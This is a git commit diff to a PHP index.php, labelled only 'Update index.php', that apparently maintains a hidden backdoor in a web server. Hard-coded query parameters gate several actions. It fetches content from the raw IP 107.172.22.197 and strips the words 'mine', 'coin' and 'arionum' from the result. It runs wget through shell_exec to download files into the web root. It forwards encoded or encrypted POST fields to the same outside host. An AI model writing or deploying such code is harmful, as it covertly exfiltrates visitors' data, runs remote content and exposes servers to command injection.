53b2205cf7a0bd550c5e6e38e771a1a0530dca04
mobileapps84741274 <64268204+mobileapps84741274@users.noreply.github.com>
2020-11-05 18:56:53 -0500

    Update index.php

--- index.php
+++ index.php
@@ -8,8 +8,16 @@ if($_GET["q"] == "")
 if($_GET["linux84"] == "linux8474")
   
 {
+  
+$google8474 = file_get_contents("http://107.172.22.197:8884/?linux84=linux8474");
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://107.172.22.197:8884/?linux84=linux8474;cat /var/www/html/linux84");
+$google8474 = preg_replace("/mine/","",$google8474);
+
+$google8474 = preg_replace("/coin/","",$google8474);
+
+$google8474 = preg_replace("/arionum/","",$google8474);
+
+echo "$google8474";
 
 }
 
@@ -38,98 +46,6 @@ $google847446 = $_POST["linux1"];
 $google847446 = base64_encode($google847446);
 
 echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://107.172.22.197:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
-
-}
-
-if($_GET["linux84"] == "linux84742")
-  
-{
-
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://107.172.22.197:8884/?linux84=linux84742;cat /var/www/html/linux84");
-
-}
-
-if($_GET["linux84"] == "linux842")
-  
-{
-
-$google84741 = $_POST["linux2"];
-
-$password="linux84";
-
-$google84741 = openssl_encrypt($google84741,"AES-128-ECB",$password);
-
-$google84742 = $_POST["linux3"];
-
-$password="linux84";
-
-$google84742 = openssl_encrypt($google84742,"AES-128-ECB",$password);
-
-$google84744 = $_POST["linux4"];
-
-$password="linux84";
-
-$google84744 = openssl_encrypt($google84744,"AES-128-ECB",$password);
-
-$google847412 = $_POST["linux5"];
-
-$password="linux84";
-
-$google847412 = openssl_encrypt($google847412,"AES-128-ECB",$password);
-
-$google847446 = $_POST["linux1"];
-
-$password="linux84";
-
-$google847446 = openssl_encrypt($google847446,"AES-128-ECB",$password);
-
-echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://107.172.22.197:8884/?linux84=linux842' --header='Content-type: application/x-www-form-urlencoded'");
-
-}
-
-if($_GET["linux84"] == "linux84744")
-  
-{
-
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://107.172.22.197:8884/?linux84=linux84744;cat /var/www/html/linux84");
-
-}
-
-if($_GET["linux84"] == "linux844")
-  
-{
-
-$google84741 = $_POST["linux2"];
-
-$password="linux84";
-
-$google84741 = openssl_encrypt($google84741,"AES-128-ECB",$password);
-
-$google84742 = $_POST["linux3"];
-
-$password="linux84";
-
-$google84742 = openssl_encrypt($google84742,"AES-128-ECB",$password);
-
-$google84744 = $_POST["linux4"];
-
-$password="linux84";
-
-$google84744 = openssl_encrypt($google84744,"AES-128-ECB",$password);
-
-$google847412 = $_POST["linux5"];
-
-$password="linux84";
-
-$google847412 = openssl_encrypt($google847412,"AES-128-ECB",$password);
-
-$google847446 = $_POST["linux1"];
-
-$password="linux84";
-
-$google847446 = openssl_encrypt($google847446,"AES-128-ECB",$password);
-
-echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://107.172.22.197:8884/?linux84=linux844' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
